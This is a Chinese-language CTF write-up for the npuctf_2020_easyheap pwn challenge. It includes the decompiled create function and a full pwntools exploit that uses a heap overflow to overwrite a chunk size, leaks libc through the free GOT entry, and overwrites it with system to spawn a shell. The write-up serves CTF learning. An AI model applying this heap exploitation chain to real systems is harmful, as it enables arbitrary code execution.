# npuctf_2020_easyheap

[题目地址](https://buuoj.cn/challenges#npuctf_2020_easyheap)

这玩意原题，原题啊！原题我都分不清size到底该覆盖成什么！

出题人偷懒，这题很大一部分完全是[hitcontraining_heapcreator](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/pwn/hitcontraining_heapcreator.md)，把那个看明白了80%的攻击思路就懂了。你问我剩下的20%是什么？我size不知道搞成什么啊！差了20%似乎不多，实际上差了1%都做不出来=(。

唯一不同的地方在create函数处。

```c
void create(void)

{
  long lVar1;
  int iVar2;
  void *pvVar3;
  size_t __size;
  long in_FS_OFFSET;
  int index;
  char local_28 [8];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  index = 0;
  do {
    if (9 < index) {
code_r0x00400a9f:
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    if (*(long *)(heaparray + (long)index * 8) == 0) {
      pvVar3 = malloc(0x10);
      *(void **)(heaparray + (long)index * 8) = pvVar3;
      if (*(long *)(heaparray + (long)index * 8) == 0) {
        puts("Allocate Error");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      printf("Size of Heap(0x10 or 0x20 only) : ");  //这里骗人的，下面才是真正能申请的大小
      read(0,local_28,8);
      iVar2 = atoi(local_28);
      __size = (size_t)iVar2;
      if ((__size != 0x18) && (__size != 0x38)) {  //只能申请0x18和0x38的大小
                    /* WARNING: Subroutine does not return */
        exit(-1);
      }
      lVar1 = *(long *)(heaparray + (long)index * 8);
      pvVar3 = malloc(__size);
      *(void **)(lVar1 + 8) = pvVar3;
      if (*(long *)(*(long *)(heaparray + (long)index * 8) + 8) == 0) {
        puts("Allocate Error");
                    /* WARNING: Subroutine does not return */
        exit(2);
      }
      **(size_t **)(heaparray + (long)index * 8) = __size;
      printf("Content:");
      read_input(*(undefined8 *)(*(long *)(heaparray + (long)index * 8) + 8),__size);
      puts("Done!");
      goto code_r0x00400a9f;
    }
    index = index + 1;
  } while( true );
}
```

create函数对能申请的堆块大小做了限制。于是乎hitcontraining_heapcreator里面的脚本就不能直接用了，需要根据现在的情况自行调整覆盖的size。大佬的[wp](https://blog.csdn.net/mcmuyanga/article/details/112851757)写得很好，还有截图演示。

```python
from pwn import *

r = remote("node4.buuoj.cn",28175)
context.log_level='debug'

def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.send(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


free_got = 0x602018
create(0x18, "dada")
create(0x18, "ddaa")
create(0x18,'aaaa')  #必须创建3个堆块，因为下方溢出覆盖size时要与16对齐，只能是\x31或者\x41。\x31不行，都没有即将要申请的0x38大，故只能\x41。\x41的大小又比两个0x18的堆块大，只能再来一个了
#更关键的是3个堆块大小正好，看那位大佬的图就知道了，\x41的大小让堆块完成吞并后正好在第三个堆块的上面。不过有一点我不明白的是，大佬蓝色框圈出的地方上面那一行为什么不算在里面呢？
edit(0, "/bin/sh\x00" + "a" * 16 + "\x41")
delete(1)
create(0x38, b'a'*0x10 + p64(0) + p64(0x21)+p64(0x100)+p64(free_got)) #0x38的大小申请到的是刚刚那个被覆盖为0x41大小的堆块，因为内存需要对齐。那么按照里面的结构，需要0x10个填充+符合原本结构的64(0)+size+程序记录的堆块大小（这里写大了，没关系，只要不写小就好）+要泄露的free_got地址
show(1)
r.recvuntil("Content : ")
free_addr = u64(r.recvuntil(b'\x7f').ljust(8, b"\x00"))
libc_base = free_addr - 620880
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + 324672
edit(1, p64(system_addr))  #把free_got改成system
delete(0) #把/bin/sh装0号堆块里了，装2号里也行
r.interactive()
```

## Flag
> flag{7e6a5fb9-d625-4700-b763-813897b2bae1}